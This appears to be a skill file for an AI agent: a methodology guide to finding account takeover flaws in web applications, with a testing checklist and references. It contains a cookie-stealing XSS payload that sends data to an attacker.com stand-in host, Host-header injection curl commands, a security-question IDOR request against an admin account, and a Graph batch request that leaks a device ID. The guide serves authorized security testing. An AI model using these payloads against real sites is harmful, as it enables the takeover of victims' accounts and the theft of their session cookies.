---
name: account-takeover
description: How to identify and test for account takeover vulnerabilities in web applications. Use this skill whenever the user mentions account takeover, authentication bypass, password reset attacks, email verification bypass, session hijacking, or any technique to compromise user accounts. This includes testing authorization issues, unicode normalization attacks, reset token reuse, CORS/CSRF/XSS exploitation, cookie manipulation, and OAuth vulnerabilities.
---

# Account Takeover Testing

A comprehensive guide for identifying and testing account takeover vulnerabilities in web applications.

## Core Attack Vectors

### 1. Authorization Issues

**Email Change Verification**
- Attempt to change the email address of any account
- Examine the confirmation process for weaknesses
- If verification is weak, change the email to your controlled address and confirm

**Test Steps:**
1. Intercept the email change request
2. Check if confirmation email is required
3. Test if confirmation link can be reused or bypassed
4. Verify if email change requires password re-authentication

### 2. Unicode Normalization Attacks

**Account Creation via Unicode**
- Create an account using Unicode characters that normalize to the victim's email
- Example: `vićtim@gmail.com` may normalize to `victim@gmail.com`

**Third-Party Identity Provider Abuse:**
1. Create an account in the identity provider with a similar email using Unicode characters
2. If the provider doesn't verify email, use it directly
3. If verification is required, attack the domain: `victim@ćompany.com`
4. Register the domain and hope the identity provider generates ASCII while the victim platform normalizes
5. Login via the identity provider to access the victim account

**Test Commands:**
```bash
# Check unicode normalization behavior
echo "vićtim@gmail.com" | iconv -f utf-8 -t ascii//TRANSLIT
```

### 3. Reset Token Reuse

**Finding Old Reset Links:**
- Check if reset links can be reused after expiration
- Use tools to find historical reset links:
  - `gau` (Get All Urls)
  - `wayback` (Wayback Machine)
  - `scan.io`

**Test Steps:**
1. Generate a password reset link
2. Wait for it to expire
3. Attempt to reuse the link
4. Check if the system validates token freshness

### 4. Pre-Account Takeover

**Race Condition Attack:**
1. Use the victim's email to sign up on the platform
2. Set a password (attempt confirmation if possible)
3. Wait for the victim to sign up using OAuth
4. Hope the regular signup gets confirmed, granting access

**Test Scenario:**
- Create account with victim's email
- Set password without email confirmation
- Monitor if victim's OAuth signup overwrites or conflicts

### 5. CORS Misconfiguration

**Exploitation Path:**
- Identify CORS misconfigurations
- Steal sensitive information from authenticated users
- Use stolen data to take over accounts or modify authentication

**Test Steps:**
1. Check `Access-Control-Allow-Origin` headers
2. Test with `*` or reflected origins
3. Attempt to read sensitive endpoints via CORS
4. Extract authentication tokens or session data

### 6. CSRF to Account Takeover

**Attack Vectors:**
- Force users to modify their password
- Change email addresses
- Modify authentication settings

**Test Steps:**
1. Identify state-changing endpoints
2. Check for CSRF token presence
3. Verify token validation
4. Create CSRF payloads for account modification

### 7. XSS to Account Takeover

**Cookie and Storage Theft:**
- Steal session cookies
- Extract local storage data
- Capture page information for account takeover

**Attribute-Only Reflected Payloads:**
- Hook `document.onkeypress` on login pages
- Exfiltrate keystrokes via `new Image().src`
- Steal credentials without form submission

**Example Payload:**
```html
<svg/onload="new Image().src='http://attacker.com/log?k='+document.cookie">
```

### 8. Same Origin + Cookie Manipulation

**Cookie Fixation:**
- Find limited XSS or subdomain takeover
- Manipulate cookies to compromise victim accounts
- Fixate session cookies before victim authentication

**Test Steps:**
1. Set a known session cookie
2. Force victim to authenticate with that cookie
3. Use the cookie to access victim's session

### 9. Password Reset Mechanism Attacks

**Security Question IDOR:**

When "update security questions" accepts a `username` parameter while authenticated:

1. Log in with a low-privilege account
2. Capture the session cookie
3. Submit victim username with new security answers
4. Authenticate via security-question login with injected answers

**Example Request:**
```http
POST /reset.php HTTP/1.1
Host: target.com
Cookie: PHPSESSID=<low-priv-session>
Content-Type: application/x-www-form-urlencoded

username=admin&new_answer1=A&new_answer2=B&new_answer3=C
```

**Follow-up:**
- Access admin dashboards gated by victim's session
- Use enumerated usernames for password spraying on ancillary services

### 10. Response Manipulation

**Boolean Response Attacks:**
- Reduce authentication responses to simple booleans
- Change `false` to `true` in responses
- Test if access is granted

**Code and Body Manipulation:**
1. Alter status code to `200 OK`
2. Modify response body to `{"success":true}` or `{}`
3. Effective with JSON-based authentication

**Test Steps:**
1. Intercept authentication response
2. Modify status code and body
3. Check if application trusts modified response

### 11. OAuth to Account Takeover

**Common Vectors:**
- OAuth callback manipulation
- State parameter bypass
- Code exchange attacks
- Token leakage through batch APIs

### 12. Host Header Injection

**Password Reset Manipulation:**
1. Modify `Host` header during password reset initiation
2. Alter `X-Forwarded-For` to attacker-controlled domain
3. Change `Host`, `Referrer`, and `Origin` headers simultaneously
4. Resend password reset email with modified headers

**Test Commands:**
```bash
# Test host header injection
curl -H "Host: attacker.com" https://target.com/reset-password

# Test X-Forwarded-For manipulation
curl -H "X-Forwarded-For: attacker.com" https://target.com/reset-password
```

### 13. Email Change Attacks

**One-Click Account Takeover:**
1. Attacker requests email change to new address
2. Attacker receives confirmation link
3. Attacker sends link to victim
4. Victim clicks link, email changes to attacker's
5. Attacker recovers password and takes over account

**Bypass Email Verification:**
1. Login with attacker@test.com and verify email
2. Change verified email to victim@test.com (no secondary verification)
3. Website now allows victim@test.com to login
4. Email verification bypassed

### 14. Old Cookie Reuse

**Session Persistence Attack:**
1. Login to account and save authenticated cookies
2. Logout from the application
3. Login again with different credentials
4. Old cookies may still work

**Test Steps:**
1. Capture cookies during authenticated session
2. Logout and login with different account
3. Attempt to use old cookies
4. Check if session is still valid

### 15. Trusted Device Cookies + Batch API

**Device Identifier Theft:**

When batch APIs allow copying unreadable subresponses to writable sinks:

1. Identify trusted-device cookie (SameSite=None, long-lived)
2. Find first-party endpoint returning device ID in JSON
3. Use batch/chained API to reference subresponses
4. Write device ID to attacker-visible sink

**Example Batch Request:**
```http
POST https://graph.facebook.com/
batch=[
  {"method":"post","omit_response_on_success":0,"relative_url":"/oauth/access_token","body":"code=SINGLE_USE_CODE","name":"leaker"},
  {"method":"post","relative_url":"PAGE_ID/posts","body":"message={result=leaker:$.machine_id}"}
]
access_token=PAGE_ACCESS_TOKEN
```

**Replay Attack:**
1. Set stolen device cookie in new session
2. Recovery treats browser as trusted
3. Access weaker recovery flows (no email/phone required)
4. Add attacker email without password or 2FA

## Testing Checklist

- [ ] Test email change verification process
- [ ] Check unicode normalization behavior
- [ ] Verify reset token expiration and reuse
- [ ] Test pre-account takeover race conditions
- [ ] Audit CORS configuration
- [ ] Check for CSRF vulnerabilities
- [ ] Test XSS vectors for cookie theft
- [ ] Verify cookie handling and fixation
- [ ] Test password reset mechanisms
- [ ] Check security question IDOR
- [ ] Test response manipulation
- [ ] Audit OAuth implementation
- [ ] Test host header injection
- [ ] Verify email change flows
- [ ] Check old cookie reuse
- [ ] Test trusted device cookie handling

## Tools and Resources

**Reconnaissance:**
- `gau` - Get All Urls for finding historical endpoints
- `wayback` - Wayback Machine for archived content
- `scan.io` - URL discovery

**Testing:**
- Burp Suite for request interception
- Browser DevTools for cookie manipulation
- Custom scripts for automation

## References

- [Turning a Harmless XSS Behind a WAF into a Realistic Phishing Vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [Firing 8 Account Takeover Methods](https://infosecwriteups.com/firing-8-account-takeover-methods-77e892099050)
- [One Click Account Take Over](https://dynnyd20.medium.com/one-click-account-take-over-e500929656ea)
- [HTB Era: Security Question IDOR & Username Oracle](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [Steal DATR Cookie](https://ysamm.com/uncategorized/2026/01/15/steal-dtsg-cookie.html)
